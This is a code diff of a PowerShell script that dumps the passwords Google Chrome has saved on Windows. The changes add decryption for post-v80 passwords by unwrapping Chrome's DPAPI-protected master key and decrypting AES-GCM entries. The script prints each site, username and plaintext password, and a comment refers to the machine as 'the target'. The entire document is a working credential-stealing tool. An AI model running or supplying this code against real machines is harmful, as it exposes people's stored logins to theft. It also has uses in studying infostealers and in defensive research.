@@ -1,6 +1,29 @@
-# Assuming Win 10 with Chrome installed, dump the saved passwords...
-$path="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Default\\Login Data"
-$query = "SELECT action_url, username_value, password_value FROM logins"
+# Assuming Win 10 with Chrome and PowerShell 5.1 installed, print out the
+# saved passwords created before Chrome v80 was installed.
+#
+# Launch recommendation:
+#
+#   pwsh .\chrome-decrypt.ps1
+# 
+$dataPath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Default\\Login Data"
+$query = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"
+
+# If the target has PowerShell 7.x installed, passwords created in Chrome
+# after v80 was installed can also be decoded.
+$decoder = $null
+if ((Get-Host).Version.Major -eq 7) {
+    $localStatePath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Local State"
+    $localStateData = Get-Content -Raw $localStatePath
+    $keyBase64 = (ConvertFrom-Json $localStateData).os_crypt.encrypted_key
+    $keyBytes = [System.Convert]::FromBase64String($keyBase64)
+    $keyBytes = $keyBytes[5..($keyBytes.length-1)]  # Remove 'DPAPI' from start
+    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
+        $keyBytes,
+        $null,
+        [Security.Cryptography.DataProtectionScope]::CurrentUser
+    )
+    $decoder = [Security.Cryptography.AesGcm]::New($masterKey)
+}
 
 Add-Type -AssemblyName System.Security
 Add-Type @"
@@ -54,7 +77,7 @@ Add-Type @"
 "@
 
 $dbH = 0
-if([WinSQLite3]::Open($path, [ref] $dbH) -ne 0) {
+if([WinSQLite3]::Open($dataPath, [ref] $dbH) -ne 0) {
     Write-Host "Failed to open!"
     [WinSQLite3]::GetErrmsg($dbh)
     exit
@@ -68,12 +91,38 @@ if ([WinSQLite3]::Prepare2($dbH, $query, -1, [ref] $stmt, [System.IntPtr]0) -ne 
 }
 
 while([WinSQLite3]::Step($stmt) -eq 100) {
+
     $url = [WinSQLite3]::ColumnString($stmt, 0)
-    $u = [WinSQLite3]::ColumnString($stmt, 1)
-    $p = [System.Text.Encoding]::ASCII.GetString(
-        [System.Security.Cryptography.ProtectedData]::Unprotect(
-            [WinSQLite3]::ColumnByteArray($stmt, 2),
+    $username = [WinSQLite3]::ColumnString($stmt, 1)
+    $encryptedPassword = [WinSQLite3]::ColumnByteArray($stmt, 2)
+
+    try {
+        $passwordBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
+            $encryptedPassword,
             $null,
-            [Security.Cryptography.DataProtectionScope]::LocalMachine))
-    Write-Host "$url,$u,$p"
+            [Security.Cryptography.DataProtectionScope]::CurrentUser
+        )
+        $password = [System.Text.Encoding]::ASCII.GetString($passwordBytes)
+        
+        Write-Host "$url,$username,$password"
+        continue
+
+    } catch [System.Security.Cryptography.CryptographicException] {
+        # Strange no-consequence exception bubbles up and we can safely ignore
+        # it.
+    }
+
+    # Try any that failed above with the v80+ decoding, if we have PowerShell
+    # 7.x.
+    if ($decoder -ne $null) {
+
+        $nonce = $encryptedPassword[3..14]
+        $cipherText = $encryptedPassword[15..($encryptedPassword.length-17)]
+        $tag = $encryptedPassword[($encryptedPassword.length-16)..($encryptedPassword.length-1)]
+        $unecryptedText = [byte[]]::new($cipherText.length)
+        $decoder.Decrypt($nonce, $cipherText, $tag, $unecryptedText)
+        $password = [System.Text.Encoding]::ASCII.GetString($unecryptedText)
+
+        Write-Host "$url,$username,$password"
+    }
 }
